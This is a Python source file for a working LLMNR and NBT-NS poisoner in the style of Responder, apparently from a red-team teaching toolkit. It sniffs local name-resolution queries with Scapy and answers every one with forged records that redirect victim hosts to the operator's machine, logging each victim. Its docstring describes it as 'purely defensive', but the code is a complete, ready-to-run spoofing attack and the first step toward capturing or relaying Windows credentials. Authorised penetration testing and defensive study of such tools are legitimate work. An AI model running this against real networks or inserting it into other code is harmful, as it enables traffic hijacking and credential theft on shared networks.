"""
llmnr_poisoner.py — LLMNR + NBT-NS name-resolution poisoner.

Classic Responder-style red-team module:

* **LLMNR** (RFC 4795) — Windows / Linux multicast name resolution.
  UDP port 5355, IPv4 multicast group ``224.0.0.252``. Uses standard
  DNS message format. We listen on the multicast group and answer
  every query with a forged A record pointing at this machine.

* **NBT-NS** (RFC 1001 / 1002) — Legacy Windows NetBIOS name service.
  UDP port 137, *broadcast*. Uses NetBIOS-encoded names (16 bytes →
  32 ASCII characters via first-level encoding). We listen for
  broadcast queries and answer with our own IP.

When a Windows host can't find a name via DNS, it falls back to LLMNR
then NBT-NS. By winning those races we redirect the victim to our
machine — useful in authorised AD pen-tests for demonstrating why
LLMNR/NBT-NS should be disabled.

The module is purely defensive in scope: it logs every poisoned query
so the operator can see what services would have been hijacked. It
does not run an SMB / HTTP listener to harvest hashes — that would be
out of scope for a teaching toolkit.

Module fails-soft when Scapy is unavailable.
"""

from __future__ import annotations

import collections
import socket
import struct
import threading
import time
from typing import Optional

try:
    from scapy.all import sniff, send  # type: ignore
    from scapy.layers.dns import DNS, DNSQR, DNSRR  # type: ignore
    from scapy.layers.inet import IP, UDP  # type: ignore
    from scapy.packet import Raw  # type: ignore

    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False


LLMNR_PORT = 5355
LLMNR_MCAST = "224.0.0.252"
NBNS_PORT = 137


# ---------------------------------------------------------------------------
# NetBIOS first-level encoding helpers (RFC 1002 §4.1)
# ---------------------------------------------------------------------------

def _decode_netbios_name(raw: bytes) -> Optional[str]:
    """Decode a 32-byte first-level-encoded NetBIOS name to plain text.

    Each pair of bytes encodes one byte of the original 16-byte NetBIOS
    name: ``high = (byte1 - 'A') << 4 | (byte2 - 'A')``. The final byte
    is typically a "name type" (00=workstation, 20=server, etc.) and
    the rest is padded with space (0x20).
    """
    try:
        if len(raw) < 32:
            return None
        out = bytearray(16)
        for i in range(16):
            hi = raw[i * 2] - ord("A")
            lo = raw[i * 2 + 1] - ord("A")
            if not (0 <= hi < 16 and 0 <= lo < 16):
                return None
            out[i] = (hi << 4) | lo
        # Drop the trailing name-type byte and strip padding.
        name = out[:15].decode("ascii", errors="replace").rstrip(" ")
        return name or None
    except Exception:
        return None


def _parse_nbns_query(payload: bytes) -> tuple[Optional[int], Optional[str]]:
    """Return ``(transaction_id, queried_name)`` for an NBT-NS query.

    The NBT-NS header is identical to a DNS header (12 bytes), followed
    by the QNAME (1-byte length prefix + 32 bytes + null terminator),
    then QTYPE (2) and QCLASS (2).
    """
    try:
        if len(payload) < 12 + 1 + 32 + 1 + 4:
            return None, None
        tid = int.from_bytes(payload[0:2], "big")
        flags = int.from_bytes(payload[2:4], "big")
        # QR bit (top bit) — only act on queries, not responses.
        if flags & 0x8000:
            return None, None
        # Question section: 1-byte len (always 0x20), 32 bytes encoded, 1-byte 0x00.
        if payload[12] != 0x20:
            return None, None
        encoded = payload[13:45]
        name = _decode_netbios_name(encoded)
        return tid, name
    except Exception:
        return None, None


def _build_nbns_response(
    tid: int, encoded_qname: bytes, answer_ip: str, ttl: int = 165,
) -> bytes:
    """Construct an NBT-NS name-query response packet."""
    flags = 0x8500  # QR=1, OPCODE=0, AA=1, TC=0, RD=1
    qdcount = 0  # No question section echoed in the response
    ancount = 1
    nscount = 0
    arcount = 0
    header = struct.pack(
        "!HHHHHH", tid, flags, qdcount, ancount, nscount, arcount,
    )
    # Answer RR: name (33 bytes for first-level-encoded), TYPE=20 (NB),
    # CLASS=1 (IN), TTL, RDLENGTH=6, RDATA = NB flags (2 bytes) + IPv4 (4 bytes).
    rr_name = bytes([0x20]) + encoded_qname + b"\x00"
    nb_flags = 0x0000   # Unique, B-node
    rdata = struct.pack("!H", nb_flags) + socket.inet_aton(answer_ip)
    rr = rr_name + struct.pack("!HHIH", 0x0020, 0x0001, ttl, len(rdata)) + rdata
    return header + rr


# ---------------------------------------------------------------------------
# LLMNRNBNSPoisoner
# ---------------------------------------------------------------------------

class LLMNRNBNSPoisoner:
    """Listen for LLMNR (UDP 5355) and NBT-NS (UDP 137) queries; answer ours.

    Each captured query produces a forged response pointing at
    ``answer_ip`` (defaults to the attacker's own IP). All hits are
    recorded in a bounded deque so the GUI can show what was poisoned.

    Parameters
    ----------
    iface:
        Network interface to sniff / send on.
    answer_ip:
        IPv4 address to embed in the forged response. Defaults to the
        attacker's interface IP.
    exclude_names:
        Set of (lower-cased) names to *not* poison — useful to avoid
        accidentally redirecting traffic for the attacker's own hostname.
    """

    HIT_LIMIT = 500

    def __init__(
        self,
        iface: Optional[str],
        answer_ip: str,
        exclude_names: Optional[set[str]] = None,
    ) -> None:
        self.iface = iface
        self.answer_ip = answer_ip
        self.exclude_names = {n.lower().strip() for n in (exclude_names or set())}
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.hits: int = 0
        self.recent_hits: collections.deque = collections.deque(
            maxlen=self.HIT_LIMIT,
        )
        self.started_at: float = 0.0

    # ------------------------------------------------------------------ #

    @property
    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    @property
    def uptime_seconds(self) -> float:
        return time.time() - self.started_at if self.started_at else 0.0

    def start(self) -> None:
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required for LLMNR/NBT-NS poisoner.")
        if not self.answer_ip:
            raise RuntimeError("LLMNR/NBT-NS poisoner needs an answer_ip.")
        if self.is_running:
            return
        self._stop_event.clear()
        self.started_at = time.time()
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "running":      self.is_running,
                "uptime":       self.uptime_seconds,
                "answer_ip":    self.answer_ip,
                "hits":         self.hits,
                "recent_hits":  list(self.recent_hits),
            }

    # ------------------------------------------------------------------ #

    def _sniff_loop(self) -> None:
        # Both protocols use IPv4 UDP. We can't filter purely on multicast
        # via BPF here (NBT-NS is broadcast, LLMNR is multicast); a port
        # filter is enough and the handler discriminates.
        bpf = f"udp port {LLMNR_PORT} or udp port {NBNS_PORT}"
        try:
            sniff(
                iface=self.iface,
                filter=bpf,
                prn=self._on_packet,
                store=False,
                stop_filter=lambda _p: self._stop_event.is_set(),
            )
        except Exception:
            pass

    def _on_packet(self, packet) -> None:
        try:
            if not (packet.haslayer(IP) and packet.haslayer(UDP)):
                return
            udpl = packet[UDP]
            dport = int(udpl.dport)
            src_ip = packet[IP].src
            sport = int(udpl.sport)
            # Don't poison ourselves.
            if src_ip == self.answer_ip:
                return
            if dport == LLMNR_PORT:
                self._handle_llmnr(packet, src_ip, sport)
            elif dport == NBNS_PORT:
                self._handle_nbns(packet, src_ip, sport)
        except Exception:
            pass

    def _handle_llmnr(self, packet, src_ip: str, sport: int) -> None:
        if not packet.haslayer(DNS):
            return
        dns = packet[DNS]
        if dns.qr != 0 or dns.qdcount < 1 or not packet.haslayer(DNSQR):
            return
        qname_raw = packet[DNSQR].qname
        qname = (
            qname_raw.decode("utf-8", errors="replace")
            if isinstance(qname_raw, bytes) else str(qname_raw)
        ).rstrip(".")
        qtype = int(packet[DNSQR].qtype)
        if qtype != 1:                  # only A records
            return
        if not qname or qname.lower() in self.exclude_names:
            return

        # Forge response: unicast back to the query's source IP/port.
        response = (
            IP(src=self.answer_ip, dst=src_ip)
            / UDP(sport=LLMNR_PORT, dport=sport)
            / DNS(
                id=dns.id, qr=1, aa=1, qd=dns.qd,
                an=DNSRR(rrname=packet[DNSQR].qname, ttl=30,
                         rdata=self.answer_ip, type="A"),
            )
        )
        try:
            send(response, iface=self.iface, verbose=0)
        except Exception:
            return
        self._record_hit(proto="LLMNR", victim=src_ip, name=qname)

    def _handle_nbns(self, packet, src_ip: str, sport: int) -> None:
        if not packet.haslayer(Raw):
            return
        payload = bytes(packet[Raw].load)
        tid, name = _parse_nbns_query(payload)
        if tid is None or not name:
            return
        if name.lower() in self.exclude_names:
            return
        encoded_qname = payload[13:45]
        response_payload = _build_nbns_response(tid, encoded_qname, self.answer_ip)
        # NBT-NS replies are sent unicast back to the querier's source port.
        response = (
            IP(src=self.answer_ip, dst=src_ip)
            / UDP(sport=NBNS_PORT, dport=sport)
            / Raw(load=response_payload)
        )
        try:
            send(response, iface=self.iface, verbose=0)
        except Exception:
            return
        self._record_hit(proto="NBT-NS", victim=src_ip, name=name)

    def _record_hit(self, proto: str, victim: str, name: str) -> None:
        with self._lock:
            self.hits += 1
            self.recent_hits.append({
                "ts":     time.time(),
                "proto":  proto,
                "victim": victim,
                "name":   name,
            })
